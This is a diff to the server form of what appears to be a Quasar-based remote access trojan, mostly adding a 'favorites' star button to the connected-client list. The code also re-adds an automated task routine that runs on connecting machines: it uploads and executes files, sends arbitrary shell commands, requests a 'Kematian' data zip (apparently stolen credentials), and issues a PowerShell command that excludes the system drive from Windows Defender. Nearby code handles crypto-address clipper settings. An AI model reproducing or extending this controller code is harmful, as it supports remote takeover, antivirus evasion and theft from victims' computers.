@@ -1,4 +1,4 @@
-﻿using Quasar.Common.Enums;
+using Quasar.Common.Enums;
 using Quasar.Common.Messages;
 using Quasar.Common.Messages.Administration.Actions;
 using Quasar.Common.Messages.ClientManagement;
@@ -24,6 +24,7 @@ using Quasar.Common.Messages.QuickCommands;
 using System.IO;
 using System.Text.Json;
 using System.Drawing;
+using System.Xml;
 
 namespace Quasar.Server.Forms
 {
@@ -186,6 +187,7 @@ namespace Quasar.Server.Forms
             AutostartListening();
             EventLogVisability();
             notifyIcon.Visible = false;
+            Favorites.LoadFavorites();
 
             LoadCryptoAddresses();
 
@@ -423,6 +425,7 @@ namespace Quasar.Server.Forms
                         {
                             _processingClientConnections = false;
                         }
+                        RefreshStarButtons();
                         return;
                     }
 
@@ -444,6 +447,69 @@ namespace Quasar.Server.Forms
                             break;
                     }
                 }
+            }
+        }
+
+        private void StartAutomatedTask(Client client)
+        {
+            if (lstTasks.InvokeRequired)
+            {
+                lstTasks.Invoke(new Action(() => StartAutomatedTask(client)));
+                return;
+            }
+
+            foreach (ListViewItem item in lstTasks.Items)
+            {
+                string taskCaption = item.Text;
+                string subItem0 = item.SubItems.Count > 1 ? item.SubItems[1].Text : "N/A";
+                string subItem1 = item.SubItems.Count > 2 ? item.SubItems[2].Text : "N/A";
+
+                switch (taskCaption)
+                {
+                    case "Remote Execute":
+                        new FileManagerHandler(client).BeginUploadFile(subItem0, "");
+                        break;
+                    case "Shell Command":
+                        client.Send(new DoSendQuickCommand { Command = subItem1, Host = subItem0 });
+                        break;
+                    case "Kematian Recovery":
+                        new KematianHandler(client).RequestKematianZip();
+                        break;
+                    case "Exclude System Drives":
+                        string powershellCode = "Add-MpPreference -ExclusionPath \"$([System.Environment]::GetEnvironmentVariable('SystemDrive'))\\\"\r\n";
+                        if (client.Value.AccountType == "Admin" || client.Value.AccountType == "System")
+                        {
+                            client.Send(new DoSendQuickCommand { Command = powershellCode, Host = "powershell.exe" });
+                        }
+                        break;
+                    case "Message Box":
+                        client.Send(new DoShowMessageBox
+                        {
+                            Caption = subItem0,
+                            Text = subItem1,
+                            Button = "OK",
+                            Icon = "None"
+                        });
+                        break;
+                }
+            }
+        }
+
+        public void SetToolTipText(Client client, string text)
+        {
+            if (client == null) return;
+
+            try
+            {
+                lstClients.Invoke((MethodInvoker)delegate
+                {
+                    var item = GetListViewItemByClient(client);
+                    if (item != null)
+                        item.ToolTipText = text;
+                });
+            }
+            catch (InvalidOperationException)
+            {
             }
         }
 
@@ -509,9 +575,6 @@ namespace Quasar.Server.Forms
                             TRXTextBox.Text = addresses.ContainsKey("TRX") ? addresses["TRX"] : string.Empty;
                             BCHTextBox.Text = addresses.ContainsKey("BCH") ? addresses["BCH"] : string.Empty;
                         }
-                        Debug.WriteLine("------------------");
-                        Debug.WriteLine(data["ClipperEnabled"]);
-                        Debug.WriteLine("------------------");
 
                         ClipperCheckbox.Checked = data.ContainsKey("ClipperEnabled") && ConvertJsonBool(data["ClipperEnabled"]);
                     }
@@ -548,67 +611,138 @@ namespace Quasar.Server.Forms
 
         #endregion
 
-        private void StartAutomatedTask(Client client)
+        private void RefreshStarButtons()
         {
-            if (lstTasks.InvokeRequired)
-            {
-                lstTasks.Invoke(new Action(() => StartAutomatedTask(client)));
-                return;
-            }
-
-            foreach (ListViewItem item in lstTasks.Items)
-            {
-                string taskCaption = item.Text;
-                string subItem0 = item.SubItems.Count > 1 ? item.SubItems[1].Text : "N/A";
-                string subItem1 = item.SubItems.Count > 2 ? item.SubItems[2].Text : "N/A";
-
-                switch (taskCaption)
-                {
-                    case "Remote Execute":
-                        new FileManagerHandler(client).BeginUploadFile(subItem0, "");
-                        break;
-                    case "Shell Command":
-                        client.Send(new DoSendQuickCommand { Command = subItem1, Host = subItem0 });
-                        break;
-                    case "Kematian Recovery":
-                        new KematianHandler(client).RequestKematianZip();
-                        break;
-                    case "Exclude System Drives":
-                        string powershellCode = "Add-MpPreference -ExclusionPath \"$([System.Environment]::GetEnvironmentVariable('SystemDrive'))\\\"\r\n";
-                        if (client.Value.AccountType == "Admin" || client.Value.AccountType == "System")
-                        {
-                            client.Send(new DoSendQuickCommand { Command = powershellCode, Host = "powershell.exe" });
-                        }
-                        break;
-                    case "Message Box":
-                        client.Send(new DoShowMessageBox
-                        {
-                            Caption = subItem0,
-                            Text = subItem1,
-                            Button = "OK",
-                            Icon = "None"
-                        });
-                        break;
-                }
-            }
-        }
-
-        public void SetToolTipText(Client client, string text)
-        {
-            if (client == null) return;
-
             try
             {
-                lstClients.Invoke((MethodInvoker)delegate
+                this.Invoke((MethodInvoker)delegate
                 {
-                    var item = GetListViewItemByClient(client);
-                    if (item != null)
-                        item.ToolTipText = text;
+                    lock (_lockClients)
+                    {
+                        foreach (ListViewItem item in lstClients.Items)
+                        {
+                            if (item.Tag is Client client)
+                            {
+                                bool found = false;
+                                foreach (Control control in lstClients.Controls)
+                                {
+                                    if (control is Button button && button.Tag is Client buttonClient && buttonClient.Equals(client))
+                                    {
+                                        found = true;
+                                        break;
+                                    }
+                                }
+                                
+                                if (!found)
+                                {
+                                    AddStarButton(item, client);
+                                }
+                            }
+                        }
+                    }
                 });
             }
             catch (InvalidOperationException)
             {
             }
+        }
+
+        private void AddStarButton(ListViewItem item, Client client)
+        {
+            var starButton = new Button
+            {
+                Size = new System.Drawing.Size(20, 20),
+                FlatStyle = FlatStyle.Flat,
+                Tag = client,
+                BackColor = Color.Transparent,
+                FlatAppearance = { BorderSize = 0 },
+                Cursor = Cursors.Hand
+            };
+
+            starButton.Image = Favorites.IsFavorite(client.Value.UserAtPc) ? 
+                Properties.Resources.star_filled : Properties.Resources.star_empty;
+            
+            starButton.Click += StarButton_Click;
+            
+            lstClients.Controls.Add(starButton);
+            
+            UpdateStarButtonPosition(starButton, item);
+            starButton.BringToFront();
+        }
+
+        private void UpdateStarButtonPosition(Control starControl, ListViewItem item)
+        {
+            if (item == null || starControl == null) return;
+
+            var bounds = item.Bounds;
+            starControl.Location = new Point(lstClients.Width - 25, bounds.Top + (bounds.Height - starControl.Height) / 2);
+        }
+
+        private void StarButton_Click(object sender, EventArgs e)
+        {
+            if (sender is Control starControl && starControl.Tag is Client client)
+            {
+                Favorites.ToggleFavorite(client.Value.UserAtPc);
+                
+                if (starControl is Button button)
+                {
+                    button.Image = Favorites.IsFavorite(client.Value.UserAtPc) ? 
+                        Properties.Resources.star_filled : Properties.Resources.star_empty;
+                }
+                
+                SortClientsByFavoriteStatus();
+            }
+        }
+
+        private void SortClientsByFavoriteStatus()
+        {
+            lstClients.BeginUpdate();
+            
+            // Remove all star buttons first
+            var controlsToRemove = lstClients.Controls.Cast<Control>()
+                .Where(c => c is Button && c.Tag is Client)
+                .ToList();
+            
+            foreach (var control in controlsToRemove)
+            {
+                lstClients.Controls.Remove(control);
+            }
+            
+            // Separate favorited and unfavorited clients
+            List<ListViewItem> favoritedItems = new List<ListViewItem>();
+            List<ListViewItem> unfavoritedItems = new List<ListViewItem>();
+            
+            foreach (ListViewItem item in lstClients.Items)
+            {
+                if (item.Tag is Client client)
+                {
+                    if (Favorites.IsFavorite(client.Value.UserAtPc))
+                        favoritedItems.Add(item);
+                    else
+                        unfavoritedItems.Add(item);
+                }
+            }
+            
+            // Clear the ListView
+            lstClients.Items.Clear();
+            
+            // Add favorited items first, then unfavorited
+            foreach (var item in favoritedItems)
+                lstClients.Items.Add(item);
+            
+            foreach (var item in unfavoritedItems)
+                lstClients.Items.Add(item);
+            
+            // Add star buttons back for each client in the correct order
+            foreach (ListViewItem item in lstClients.Items)
+            {
+                if (item.Tag is Client client)
+                {
+                    AddStarButton(item, client);
+                }
+            }
+            
+            lstClients.EndUpdate();
         }
 
         private void AddClientToListview(Client client)
@@ -630,6 +764,8 @@ namespace Quasar.Server.Forms
                     lock (_lockClients)
                     {
                         lstClients.Items.Add(lvi);
+                        AddStarButton(lvi, client);
+                        SortClientsByFavoriteStatus();
                     }
                 });
                 EventLog(client.Value.UserAtPc + " Has connected.", "normal");
@@ -653,6 +789,16 @@ namespace Quasar.Server.Forms
                         foreach (ListViewItem lvi in lstClients.Items.Cast<ListViewItem>()
                             .Where(lvi => lvi != null && client.Equals(lvi.Tag)))
                         {
+                            // Remove star button
+                            var controlsToRemove = lstClients.Controls.Cast<Control>().Where(
+                                c => c.Tag is Client buttonClient && buttonClient.Equals(client)).ToList();
+                            
+                            foreach (var control in controlsToRemove)
+                            {
+                                lstClients.Controls.Remove(control);
+                                control.Dispose();
+                            }
+                            
                             lvi.Remove();
                             break;
                         }
@@ -1397,6 +1543,72 @@ namespace Quasar.Server.Forms
 
         private void clearSelectedToolStripMenuItem1_Click(object sender, EventArgs e)
         {
+        }
+
+        private void lstClients_Resize(object sender, EventArgs e)
+        {
+            UpdateAllStarPositions();
+        }
+
+        private void UpdateAllStarPositions()
+        {
+            this.BeginInvoke(new Action(() =>
+            {
+                // Clean up any star controls that don't have matching clients
+                List<Control> starsToRemove = new List<Control>();
+                foreach (Control control in this.Controls)
+                {
+                    if ((control is PictureBox) && control.Tag is Client starClient)
+                    {
+                        bool found = false;
+                        foreach (ListViewItem item in lstClients.Items)
+                        {
+                            if (item.Tag is Client itemClient && itemClient.Equals(starClient))
+                            {
+                                UpdateStarButtonPosition(control, item);
+                                found = true;
+                                break;
+                            }
+                        }
+
+                        if (!found)
+                        {
+                            starsToRemove.Add(control);
+                        }
+                    }
+                }
+
+                // Remove stars for clients that no longer exist
+                foreach (var control in starsToRemove)
+                {
+                    this.Controls.Remove(control);
+                    control.Dispose();
+                }
+            }));
+        }
+
+        private void lstClients_MouseWheel(object sender, MouseEventArgs e)
+        {
+            UpdateAllStarPositions();
+        }
+
+        private void lstClients_ColumnWidthChanged(object sender, ColumnWidthChangedEventArgs e)
+        {
+            UpdateAllStarPositions();
+        }
+
+        private void MainTabControl_SelectedIndexChanged(object sender, EventArgs e)
+        {
+            if (MainTabControl.SelectedTab == tabPage1)
+            {
+                RefreshStarButtons();
+                SortClientsByFavoriteStatus();
+            }
+        }
+
+        private void lstClients_DrawItem(object sender, DrawListViewItemEventArgs e)
+        {
+            e.DrawDefault = true;
         }
     }
 }
